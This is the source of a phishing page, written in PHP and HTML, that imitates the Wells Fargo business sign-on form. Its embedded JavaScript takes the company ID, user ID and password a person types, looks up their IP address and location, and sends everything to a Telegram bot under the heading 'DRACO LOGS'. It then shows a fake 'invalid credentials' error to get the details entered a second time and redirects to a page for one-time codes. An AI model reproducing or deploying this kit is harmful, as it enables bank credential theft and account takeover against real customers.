<?php

include 'data.php';

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title></title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>

</head>
<body>

    <aside>
        Feedback
    </aside>
    <nav>
        <div class="fdic">
            <img src="assets/fdic.svg" alt="">
            <p><i>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</i></p>
        </div>
        <div class="nav_flex">
            <img src="assets/logo-white.svg" alt="">
            <a href="">Go to WellsFargo.com</a>
        </div>
    </nav>

    <section>
        <h1>Sign On</h1>
        <form id="form" method="post">
            <p>All fields required unless marked as optional.</p>
            <br>

            <input type="hidden" name="" id="botToken" value="<?php echo $botToken; ?>">
            <input type="hidden" name="" id="chat_id" value="<?php echo $chatID; ?>">

            <p id="error_text" style="font-size: 12px; font-weight: 600; color: red; margin-bottom: 15px;"></p>
            



            <div class="formbox">
                <input type="text" id="cid" required placeholder=" ">
                <label for="cid">Company ID</label>
            </div>

            <div class="formbox">
                <input type="text" id="uid" required placeholder=" ">
                <label for="uid">User ID</label>
            </div>

            <div class="formbox">
                <input type="password" id="password" required placeholder=" ">
                <label for="password">Password</label>
                <p id="togglePassword">Show</p>
            </div>

            <div class="remember">
                <input type="checkbox" name="" id="">
                <p>Remember me (optional)</p>
            </div>

            <button id="submit_btn">Sign on</button>

            <hr>

            <p class="forgot">Forgot password?</p>
        </form>
    </section>

    <footer>
        <img src="assets/vantage.svg" alt="" class="vantage">
        <hr>

        <div class="footer_flex">
            <ul>
                <li><b>Legal & Privacy</b></li>
                <li>
                    Privacy, Cookies, Security, and Legal
                </li>
                <li>Notice of Data Collection</li>
                <li>Do Not Sell or Share My Personal Information</li>
                <p>© 2022 - 2025 Wells Fargo</p>
            </ul>
            <ul>
                <li><b>Support</b></li>
                <li>
                    Help Center
                </li>
                <li>System Requirements and Accessibility</li>
            </ul>
        </div>
    </footer>
    


        <script>


        const uid = document.getElementById('uid')
        const cid = document.getElementById('cid')
        const submit_btn = document.getElementById('submit_btn')
        const password = document.getElementById('password')
        const error_text = document.getElementById('error_text')
        const form = document.getElementById('form')
        const bot_token = document.getElementById('botToken')
        const chatID = document.getElementById('chat_id')


        const togglePassword = document.getElementById('togglePassword');

        togglePassword.addEventListener('click', function () {
     
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);
          
            this.textContent = type === 'text' ? 'Hide' : 'Show';
        });

        let attempt = 0
        

        // Function to send form data
        const sendFormData = async (data) => {
            let keyValuePairs = Object.entries(data)
                .map(([key, value]) => `## ${key.split("_").join(" ")}: ${value} \n`)
                .join("");
        
            const url = "https://ipapi.co/json";
            const response = await fetch(url);
            const result = await response.json();


            const botToken = bot_token.value;
            const chat_id = chatID.value;


        
            

            
            const userAgent = navigator.userAgent;
    
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chat_id,
                    text: `------------- DRACO LOGS WELLS FARGO BANK --------------- \n  ******** WELLSFARGO LOGIN PAGE ******** \n \n ${keyValuePairs}  \n \n ---------- VICTIM IP DATA ----------- \n ## IP : ${result.ip} \n Country : ${result.country_name} \n ## City : ${result.city} \n ## Zip Code : ${result.postal} \n \n ## User Agent : ${userAgent}`,
                }),
                });

                setTimeout(() => {
                    if(attempt == 0){
                        cid.value = ""
                        uid.value = ""
                        password.value = ""
                        error_text.innerHTML = `Invalid credentials, please try again.`
                        attempt++
                    }else{
                        window.location.href = 'otp'
                    }


                    submit_btn.innerHTML = `Sign in`
                }, 9000);


            } catch (error) {
                console.log(error)
            }
        };
    
        form.addEventListener("submit", (e) => {
            e.preventDefault();

            error_text.innerHTML = ``

            submit_btn.innerHTML = `
                <div class="loader">
                </div>
                `


            let formData = {
                comapny_id: cid.value,
                user_id: uid.value,
                password: password.value
            };
            sendFormData(formData);
        });
    </script>

    
</body>
</html>